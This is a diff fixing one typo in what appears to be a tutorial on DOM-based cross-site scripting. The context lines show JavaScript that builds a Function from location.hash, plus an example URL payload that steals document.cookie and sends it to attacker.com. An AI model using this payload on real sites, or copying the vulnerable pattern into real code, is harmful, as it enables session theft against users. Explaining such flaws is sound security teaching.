@@ -32,7 +32,7 @@ const myAlert = Function('alert("' + document.location.hash.substring(1) + '")')
 myAlert();
 ```
 
-So, let's visit and "share sorrys"
+So, let's visit and "share sorrows"
 
 ```
 https://example.com/#sorry");(new Image).src="//attacker.com/?cookie="+document.cookie;("
